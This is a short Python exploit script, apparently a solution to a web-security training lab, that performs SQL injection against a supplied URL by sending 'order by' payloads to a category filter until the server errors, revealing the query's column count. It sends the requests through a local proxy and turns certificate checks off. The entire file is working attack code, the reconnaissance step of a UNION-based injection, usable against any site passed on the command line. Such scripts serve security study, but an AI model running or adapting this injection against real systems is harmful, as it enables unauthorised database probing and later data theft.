import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit(url):
    path="/filter?category=Gifts"
    for i in range(1,50):
        payload = f"'+order+by+{i}--" #payload must be URL encoded
        r = requests.get(url + path + payload, verify=False , proxies= proxies)
        res = r.text 
        if "Internal Server Error" in res:
            return i - 1  
            break
        i = i + 1
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print('[-] Usage: %s <url>' % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)

    print("[+]Getting number of columns.....")
    num_col = exploit(url)
    if num_col:
        print(f"[+] Number of columns = {num_col}")
    else:
        print("[-] Unsuccessful.")